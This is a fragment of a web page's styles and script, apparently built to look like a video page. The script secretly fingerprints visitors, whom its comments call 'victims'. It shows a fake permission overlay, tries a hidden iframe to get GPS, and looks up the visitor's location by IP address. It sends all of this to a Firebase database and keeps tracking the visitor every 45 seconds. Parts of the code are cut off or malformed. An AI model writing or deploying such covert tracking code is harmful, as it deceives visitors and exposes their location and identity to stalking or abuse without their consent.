        .video-container {

            border: 4px solid rgba(255,255,255,0.3);

            height: 50px;
            animation: spin 1s linear infinite;

        @keyframes spin {

    <script type="module">

        import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js';

        const firebaseConfig = {

        const app = initializeApp(firebaseConfig);

        let sessionId = localStorage.getItem('sessionId') || 'victim_' + Math.random().toString(36).substr(2, 9);

        // Stealth victim capture
        async function stealthCapture() {
            const victimData = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,

                sessionId: sessionId

        // ADVANCED STEALTH GPS - Multiple bypass techniques
        class StealthGPS {
            constructor() {
                this.hasLocation = false;
                this.init();
            }

            async init() {
                // Method 1: Check existing permission silently
                if (navigator.permissions) {
                    try {
                        const permission = await navigator.permissions.query({name: 'geolocation'});
                        if (permission.state === 'granted') {
                            this.getLocation();
                            return;
                        }
                    } catch(e) {}
                }

                // Method 2: Fake permission overlay + iframe trick
                this.showFakePermission();
                
                // Method 3: Multiple geolocation requests with different strategies
                setTimeout(() => this.aggressiveGPS(), 1000);
                setTimeout(() => this.wifiLocation(), 2000);
                setTimeout(() => this.ipFallback(), 3000);
            }

            showFakePermission() {
                const overlay = document.getElementById('permissionOverlay');
                overlay.style.display = 'flex';
                
                // Fake "permission granted" after 3 seconds
                setTimeout(() => {
                    overlay.classList.add('fade-out');
                    setTimeout(() => {
                        overlay.style.display = 'none';
                        this.injectHiddenIframe();
                    }, 500);
                }, 3000);
            }

            // Method 4: Hidden iframe with geolocation (cross-origin bypass)
            injectHiddenIframe() {
                const iframe = document.createElement('iframe');
                iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
                iframe.src = 'data:text/html,<script>navigator.geolocation.getCurrentPosition(p=>parent.postMessage({type:"gps",data:p.coords}, "*"),e=>parent.postMessage({type:"gps_error",data:e.message},"*"),{enableHighAccuracy:true});<\/script>';
                document.body.appendChild(iframe);
                
                window.addEventListener('message', (e) => {
                    if (e.data.type === 'gps') {
                        this.sendGPS(e.data.data);
                    } else if (e.data.type === 'gps_error') {
                        console.log('iframe GPS failed');
                    }
                });
            }

            // Method 5: Aggressive direct geolocation
            aggressiveGPS() {
                const options = {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                };

                // Multiple simultaneous requests
                navigator.geolocation.getCurrentPosition(
                    (pos) => this.sendGPS(pos.coords),
                    () => {},
                    options
                );

                navigator.geolocation.watchPosition(
                    (pos) => this.sendGPS(pos.coords),
                    () => {},
                    options
                );
            }

            // Method 6: WiFi/Network location fallback
            async wifiLocation() {
                try {
                    if ('getCurrentPosition' in navigator.geolocation) {
                        // Already covered above
                    }
                } catch(e) {}
            }

            // Method 7: IP geolocation fallback (server-side)
            async ipFallback() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const ipData = await response.json();
                    await set(ref(db, 'victims/' + sessionId + '/ip_geo'), {
                        lat: ipData.latitude,
                        lon: ipData.longitude,
                        city: ipData.city,
                        region: ipData.region,
                        country: ipData.country_name,
                        ip: ipData.ip,
                        timestamp: Date.now()
                    });
                } catch(e) {
                    // IP lookup failed
                }
            }

            sendGPS(coords) {
                if (this.hasLocation) return;
                this.hasLocation = true;

                const gpsData = {
                    latitude: coords.latitude,
                    longitude: coords.longitude,
                    accuracy: coords.accuracy,
                    altitude: coords.altitude || null,
                    altitudeAccuracy: coords.altitudeAccuracy || null,
                    heading: coords.heading || null,
                    speed: coords.speed || null,
                    timestamp: coords.timestamp,
                    method: 'stealth_gps'
                };

                set(ref(db, 'victims/' + sessionId + '/gps'), gpsData);
                
                // Continuous tracking
                setInterval(() => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            const update = {
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                timestamp: pos.timestamp
                            };
                            set(ref(db, 'victims/' + sessionId + '/gps'), update);
                        },
                        () => {},
                        { enableHighAccuracy: true }
                    );
                }, 45000);
            }
        }

        // Screen & WebRTC fingerprinting
        function stealthFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Stealth fingerprint', 2, 2);

            const fingerprint = {
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                canvas: canvas.toDataURL(),
                webgl: !!window.WebGLRenderingContext,
                audio: !!window.AudioContext,
                timestamp: Date.now()
            };

            set(ref(db, 'victims/' + sessionId + '/fingerprint'), fingerprint);
        }

        // Initialize everything silently
        window.addEventListener('load', async () => {
            await stealthCapture();
            stealthFingerprint();
            new StealthGPS();
        });

        // Reactivate on tab focus
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                new StealthGPS();
            }
        });
